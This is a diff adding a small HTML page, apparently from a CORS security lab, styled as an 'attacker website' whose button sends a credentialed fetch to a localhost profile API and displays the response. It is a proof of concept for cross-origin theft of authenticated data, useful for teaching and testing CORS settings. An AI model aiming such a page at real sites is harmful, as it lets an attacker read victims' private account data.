@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>CORS Attacker Lab</title>
+  </head>
+  <body>
+    <h2>Attacker Website</h2>
+    <button id="read">Test CORS</button>
+    <pre id="result">Waiting...</pre>
+
+    <script>
+      document.getElementById("read").onclick = async () => {
+        const output = document.getElementById("result");
+
+        try {
+          const response = await fetch("http://localhost:3000/api/profile", {
+            credentials: "include",
+          });
+
+          const data = await response.json();
+
+          output.textContent = JSON.stringify(data, null, 2);
+        } catch (error) {
+          output.textContent = "Request failed: " + error.message;
+        }
+      };
+    </script>
+  </body>
+</html>
